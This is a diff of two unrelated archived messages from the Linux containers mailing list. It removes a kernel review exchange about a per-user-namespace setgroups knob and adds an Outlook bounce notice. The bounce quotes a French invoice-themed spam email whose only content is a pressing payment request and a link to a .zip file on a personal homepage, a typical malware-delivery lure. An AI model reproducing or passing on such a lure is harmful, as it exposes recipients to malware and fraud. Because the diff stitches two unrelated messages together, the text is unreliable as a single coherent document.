@@ -1,32 +1,13 @@
-From: Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>
-Subject: Re: [CFT][PATCH 7/8] userns: Add a knob to disable setgroups on a per
-	user namespace basis
-Date: Tue, 9 Dec 2014 16:21:23 -0800
-Message-ID: <CALCETrWpzvNm=fjOa3_+4QOqYP8qZUJvQAd6AsRZ71xyHZQRCg__35708.1875009046$1418170920$gmane$org@mail.gmail.com>
-References: <52e0643bd47b1e5c65921d6e00aea1f724bb510a.1417281801.git.luto@amacapital.net>
-	<87fvcxyf28.fsf_-_@x220.int.ebiederm.org>
-	<874mtdyexp.fsf_-_@x220.int.ebiederm.org>
-	<CALCETrXyC7XPaqj6oe-TmyypOVc_CkZbF6UAAx8YfkyD=gEMOQ@mail.gmail.com>
-	<87a935u3nj.fsf@x220.int.ebiederm.org>
-	<CALCETrXkEOiyzpvqtXtk1f4sL+M1Q-Y6rV=K91ez3yv2nb4Y0Q@mail.gmail.com>
-	<87388xodlj.fsf@x220.int.ebiederm.org>
-	<CALCETrXWx2-ZejEHmOi7aSoF-qJMRGR5yseeMhuurZwJRrQbUg@mail.gmail.com>
-	<87h9x5re41.fsf_-_@x220.int.ebiederm.org>
-	<87mw6xpzb0.fsf_-_@x220.int.ebiederm.org>
-	<CALCETrU-o5mPr1jCaLXDuuF6J2N470zAtx=8Fa-SjF=ZpdE8mQ@mail.gmail.com>
-	<87ppbtn4mv.fsf@x220.int.ebiederm.org>
-	<CALCETrXSScp77BUJR5NSTh5-RnEZ9rqELSGJBeEzgdQ-OtohuQ@mail.gmail.com>
-	<87a92xn2io.fsf@x220.int.ebiederm.org>
-	<87r3w8liw4.fsf@x220.int.ebiederm.org>
-	<87iohklfvj.fsf_-_@x220.int.ebiederm.org>
-	<87fvcok11h.fsf_-_@x220.int.ebiederm.org>
-	<CALCETrVfKiXuY=KY_=nHpkTyLWgpy_3DK=4Mr2mhpyX9z1TzrA@mail.gmail.com>
-	<971ad3f6-90fd-4e3f-916c-8988af3c826d@email.android.com>
+From: <postmaster-0z69Jxny6qU@public.gmane.org>
+Subject: Undeliverable: Details facture 62824371217.
+Date: Wed, 10 Dec 2014 14:32:32 +0000
+Message-ID: <48719411-daa8-42c9-bd21-599c42940bf6@AM3PR07MB242.eurprd07.prod.outlook.com>
+References: <00a401d01486$1f79e600$0200a8c0@de384>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============4897293794928560792=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <971ad3f6-90fd-4e3f-916c-8988af3c826d-2ueSQiBKiTY7tOexoI0I+QC/G2K4zDHf@public.gmane.org>
+Content-Language: en-US
+In-Reply-To: <00a401d01486$1f79e600$0200a8c0@de384>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -36,52 +17,148 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: "Eric W.Biederman" <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>
-Cc: linux-man <linux-man-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Kees Cook <keescook-F7+t8E8rja9g9hUCZPvPmw@public.gmane.org>, Linux API <linux-api-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Linux Containers <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, Josh Triplett <josh-iaAMLnmF4UmaiuxdJuQwMA@public.gmane.org>, stable <stable-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, "linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Kenton Varda <kenton-AuYgBwuPrUQTaNkGU808tA@public.gmane.org>, LSM <linux-security-module-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Michael Kerrisk-manpages <mtk.manpages-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, Richard Weinberger <richard-/L3Ra7n9ekc@public.gmane.org>, Casey Schaufler <casey-iSGtlc1asvQWG2LlvL+J4A@public.gmane.org>, Andrew Morton <akpm-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-On Tue, Dec 9, 2014 at 4:04 PM, Eric W.Biederman <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org> wrote:
->
->
-> On December 9, 2014 4:28:38 PM CST, Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org> wrote:
->>On Tue, Dec 9, 2014 at 12:42 PM, Eric W. Biederman
->><ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org> wrote:
->>>
->>> - Expose the knob to user space through a proc file
->>/proc/<pid>/setgroups
->>>
->>>   A value of "deny" means the setgroups system call is disabled in
->>the
->>>   current processes user namespace and can not be enabled in the
->>>   future in this user namespace.
->>>
->>>   A value of "allow" means the segtoups system call is enabled.
->>>
->>> - Descendant user namespaces inherit the value of setgroups from
->>>   their parents.
->>>
->>> - A proc file is used (instead of a sysctl) as sysctls
->>>   currently do not pass in a struct file so file_ns_capable
->>>   is unusable.
->>
->>Reviewed-by: Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>
->>
->>But I still don't like the name "setgroups".  People may look at that
->>and have no clue what the scope of the setting is.  And anyone who, as
->>root, writes "deny" to /proc/self/setgroups, thinking that it acts on
->>self, will be in for a surprise.
->
-> True setgroups isn't perfect.  Documenting it in a manpage may have to be enough. The only real improvement I can think of would be to make the setting a sysctl.   But I think pursuing that approaches the point where perfection is the enemy of getting this problem fixed.
->
+--===============4897293794928560792==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="2268bdef-16f4-439f-98ee-8d0af470b117"
+Content-Language: en-US
 
-Would "userns_setgroups" be okay?
+--2268bdef-16f4-439f-98ee-8d0af470b117
+Content-Type: text/plain; charset="Windows-1252"
+Content-Transfer-Encoding: quoted-printable
 
---Andy
+Delivery has failed to these recipients or groups:
 
-> Eric
+a.h.k-0z69Jxny6qU@public.gmane.org<mailto:a.h.k-0z69Jxny6qU@public.gmane.org>
+The email address you specified couldn't be found or is invalid. It may be =
+due to a bad entry in your Outlook or Outlook Web App recipient AutoComplet=
+e cache. Use the steps below to clear the entry from the cache:
+
+  1.  Click New mail.
+  2.  In the To field start typing the recipient's name or email address un=
+til the recipient appears in the drop-down list.
+  3.  Use the DOWN ARROW and UP ARROW keys to select the recipient, and the=
+n press the DELETE key.
+
+Then resend your message =96 delete and retype the recipient=92s name or e-=
+mail address before sending it.
+
+For more tips to help resolve this issue see DSN 5.1.x Errors in Exchange O=
+nline and Office 365<http://go.microsoft.com/fwlink/?LinkId=3D389363>.
 
 
 
--- 
-Andy Lutomirski
-AMA Capital Management, LLC
+
+
+
+
+
+
+Diagnostic information for administrators:
+
+Generating server: AM3PR07MB242.eurprd07.prod.outlook.com
+
+a.h.k-0z69Jxny6qU@public.gmane.org
+Remote Server returned '550 5.1.1 RESOLVER.ADR.RecipNotFound; Recipient not=
+ found by SMTP address lookup'
+
+Original message headers:
+
+Received: from AMXPR07CA0024.eurprd07.prod.outlook.com (10.242.64.24) by
+ AM3PR07MB242.eurprd07.prod.outlook.com (10.242.18.141) with Microsoft SMTP
+ Server (TLS) id 15.1.31.17; Wed, 10 Dec 2014 14:32:31 +0000
+Received: from AM1FFO11FD029.protection.gbl (2a01:111:f400:7e00::152) by
+ AMXPR07CA0024.outlook.office365.com (2a01:111:e400:1000::24) with Microsof=
+t
+ SMTP Server (TLS) id 15.1.31.17 via Frontend Transport; Wed, 10 Dec 2014
+ 14:32:30 +0000
+Received: from de384 (94.247.178.107) by
+ AM1FFO11FD029.mail.protection.outlook.com (10.174.64.218) with Microsoft S=
+MTP
+ Server id 15.1.26.17 via Frontend Transport; Wed, 10 Dec 2014 14:32:30 +00=
+00
+Received: from [94.247.178.107] by de384 id i417CryGh8XqM5; Wed, 10 Dec 201=
+4 15:32:30 +0100
+Message-ID: <00a401d01486$1f79e600$0200a8c0@de384>
+From: Cameo <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <a.h.k-0z69Jxny6qU@public.gmane.org>
+Subject: Details facture 62824371217.
+Date: Wed, 10 Dec 2014 15:32:30 +0100
+MIME-Version: 1.0
+Content-Type: text/plain; charset=3D"utf-8"
+Content-Transfer-Encoding: 8bit
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-EOPAttributedMessage: 0
+X-Forefront-Antispam-Report: CIP:94.247.178.107;CTRY:FR;IPV:NLI;EFV:NLI;
+X-Microsoft-Antispam: UriScan:;
+X-Microsoft-Antispam: BCL:0;PCL:0;RULEID:;SRVR:AM3PR07MB242;
+
+
+--2268bdef-16f4-439f-98ee-8d0af470b117
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns;AM3PR07MB242.eurprd07.prod.outlook.com
+Received-From-MTA: dns;de384
+Arrival-Date: Wed, 10 Dec 2014 14:32:31 +0000
+
+Final-Recipient: rfc822;a.h.k-0z69Jxny6qU@public.gmane.org
+Action: failed
+Status: 5.1.1
+Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; Recipient not found by SMTP address lookup
+
+
+--2268bdef-16f4-439f-98ee-8d0af470b117
+Content-Type: message/rfc822
+
+Received: from AMXPR07CA0024.eurprd07.prod.outlook.com (10.242.64.24) by
+ AM3PR07MB242.eurprd07.prod.outlook.com (10.242.18.141) with Microsoft SMTP
+ Server (TLS) id 15.1.31.17; Wed, 10 Dec 2014 14:32:31 +0000
+Received: from AM1FFO11FD029.protection.gbl (2a01:111:f400:7e00::152) by
+ AMXPR07CA0024.outlook.office365.com (2a01:111:e400:1000::24) with Microsoft
+ SMTP Server (TLS) id 15.1.31.17 via Frontend Transport; Wed, 10 Dec 2014
+ 14:32:30 +0000
+Received: from de384 (94.247.178.107) by
+ AM1FFO11FD029.mail.protection.outlook.com (10.174.64.218) with Microsoft SMTP
+ Server id 15.1.26.17 via Frontend Transport; Wed, 10 Dec 2014 14:32:30 +0000
+Received: from [94.247.178.107] by de384 id i417CryGh8XqM5; Wed, 10 Dec 2014 15:32:30 +0100
+Message-ID: <00a401d01486$1f79e600$0200a8c0@de384>
+From: Cameo <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <a.h.k-0z69Jxny6qU@public.gmane.org>
+Subject: Details facture 62824371217.
+Date: Wed, 10 Dec 2014 15:32:30 +0100
+MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-EOPAttributedMessage: 0
+X-Forefront-Antispam-Report: CIP:94.247.178.107;CTRY:FR;IPV:NLI;EFV:NLI;
+X-Microsoft-Antispam: UriScan:;
+X-Microsoft-Antispam: BCL:0;PCL:0;RULEID:;SRVR:AM3PR07MB242;
+
+
+
+
+
+Bonjour,
+
+
+=EF=BB=BFLa facture doit etre payee avant la fin de la semaine
+http://oelsmeier.homepage.t-online.de/Perfil.zip?2fxJM6qDTw1dAIUoWM30hp9x
+
+
+
+--2268bdef-16f4-439f-98ee-8d0af470b117--
+
+--===============4897293794928560792==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============4897293794928560792==--
